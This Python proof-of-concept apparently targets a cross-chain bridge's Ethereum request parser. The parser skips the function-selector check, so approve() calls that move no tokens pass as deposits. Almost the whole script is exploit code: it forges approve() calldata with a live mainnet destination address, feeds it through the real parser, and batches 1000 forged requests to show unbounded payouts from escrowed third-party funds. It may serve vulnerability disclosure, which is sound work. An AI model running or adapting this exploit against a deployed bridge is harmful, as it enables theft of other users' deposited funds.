#!/usr/bin/env python3
"""
PoC - symbol/product bridge, Ethereum (wrapped -> native) request parser.

Bug: bridge/ethereum/EthereumUtils.py::extract_wrap_request_from_transaction()
decodes an ERC-20 deposit from *raw calldata offsets* and never checks the 4-byte
function selector.  Any *successful* transaction sent to the configured token
contract whose calldata carries the bridge address at offset 16 and a 32-byte
"amount" at offset 36 is accepted as a deposit of that amount, with the remaining
calldata used as the destination address.

`approve(bridge, amount)` has exactly this ABI layout and moves no tokens, so an
attacker with a zero-token balance can forge an unlimited unwrap request, which
the bridge then pays out from its escrowed native balance (bridge escrow =
third-party deposits).

The script runs the *unmodified* parser from the clone.  Only the RPC envelope
that the connector would build (ots_searchTransactionsBefore response) is mocked.

Usage:
    python3 -m venv /tmp/venv && . /tmp/venv/bin/activate
    pip install symbol-sdk-python==3.3.3 web3==8.0.0
    PYTHONPATH=<clone>/bridge python3 bridge_approve_poc.py <clone>/bridge
"""

import sys
from binascii import hexlify

BRIDGE_DIR = sys.argv[1] if len(sys.argv) > 1 else '.'
sys.path.insert(0, BRIDGE_DIR)

from bridge.ethereum.EthereumAdapters import EthereumAddress  # noqa: E402
from bridge.ethereum.EthereumUtils import extract_wrap_request_from_transaction  # noqa: E402
from bridge.models.AddressValidator import try_convert_network_address_to_string  # noqa: E402
from symbolchain.symbol.Network import Network  # noqa: E402

# a real Symbol mainnet address (raw 24 bytes), taken from the live REST gateway:
#   /accounts/NCVORTEX4XD5IQASZQEHDWUXT33XBOTBMKFDCLI -> address 68AAE8CC...
DESTINATION_RAW = bytes.fromhex('68AAE8CC97E5C7D44012CC0871DA979EF770BA61628A312D')

BRIDGE_ADDRESS = '00d6dcee7c21a8c7ab697602367992fc1b75f9ba'  # config 'bridgeAddress'
TOKEN_CONTRACT = '00d6dcee7c21a8c7ab697602367992fc1b75f9ba'  # config 'mosaicId' (search address)

SELECTOR_TRANSFER = bytes.fromhex('a9059cbb')   # transfer(address,uint256) - legit
SELECTOR_APPROVE = bytes.fromhex('095ea7b3')    # approve(address,uint256)  - moves nothing
ATTACK_AMOUNT = 10 ** 24                        # 1,000,000 wXYM if 18 decimals


def make_calldata(selector, recipient, amount, message):
    """ABI-encode f(address,uint256) + trailing bytes, as ethers.js would."""
    return b''.join([
        selector,
        bytes(12) + bytes.fromhex(recipient),          # offset 4..36
        amount.to_bytes(32, 'big'),                    # offset 36..68
        message,                                       # offset 68..
    ])


def make_rpc_transaction(calldata, is_success=True, tx_hash='11' * 32):
    """Shape returned by EthereumConnector::incoming_transactions (ots_searchTransactionsBefore)."""
    return {
        'meta': {'height': 20_000_000, 'isSuccess': is_success},
        'transaction': {
            'from': '0x0000000000000000000000000000000000000001',
            'hash': '0x' + tx_hash,
            'input': '0x' + hexlify(calldata).decode(),
        },
    }


def is_valid_address(raw_address):
    """Same predicate the bridge wires in for the native network (SymbolNetworkFacade)."""
    address_string = try_convert_network_address_to_string(Network.MAINNET, raw_address)
    return (address_string is not None, address_string)


def show(title, calldata, **kwargs):
    result = extract_wrap_request_from_transaction(
        is_valid_address, EthereumAddress('0x' + BRIDGE_ADDRESS), make_rpc_transaction(calldata, **kwargs))
    print(f'\n[{title}]')
    print(f'  calldata ({len(calldata)} bytes): 0x{hexlify(calldata).decode()}')
    if result is None:
        print('  -> ignored (recipient != bridge)')
    elif result.is_error:
        print(f'  -> rejected: {result.error.message}')
    else:
        request = result.request
        print('  -> QUEUED AS UNWRAP REQUEST (pays out on the native chain)')
        print(f'     amount              = {request.amount} atomic units')
        print(f'     destination address = {request.destination_address}')
        print(f'     sender (eth)        = {request.sender_address}')
        print(f'     request id          = {request.transaction_hash}:{request.transaction_subindex}')


if __name__ == '__main__':
    print('bridge parser: bridge/ethereum/EthereumUtils.py (symbol/product @ cb3151d5c505)')
    print(f'bridge address = 0x{BRIDGE_ADDRESS}')

    # control: legitimate ERC-20 transfer(bridge, amount) still parsed
    show('control: transfer(bridge, amount)',
         make_calldata(SELECTOR_TRANSFER, BRIDGE_ADDRESS, ATTACK_AMOUNT, DESTINATION_RAW))

    # attack: approve(bridge, amount) + destination bytes. No token balance required.
    show('exploit: approve(bridge, amount) + 24-byte destination',
         make_calldata(SELECTOR_APPROVE, BRIDGE_ADDRESS, ATTACK_AMOUNT, DESTINATION_RAW))

    # escalation: one tx cannot be replayed (hash dedupe), but the queue in a single
    # download window accepts an unbounded number of *distinct* approve transactions.
    total = 0
    parsed = 0
    for i in range(1000):
        tx = make_rpc_transaction(make_calldata(SELECTOR_APPROVE, BRIDGE_ADDRESS, ATTACK_AMOUNT,
                                                DESTINATION_RAW), tx_hash=f'{i:064X}')
        result = extract_wrap_request_from_transaction(
            is_valid_address, EthereumAddress('0x' + BRIDGE_ADDRESS), tx)
        if result and not result.is_error:
            parsed += 1
            total += result.request.amount
    print(f'\n[batch] {parsed} distinct approve() txs -> {total} atomic units queued for payout')
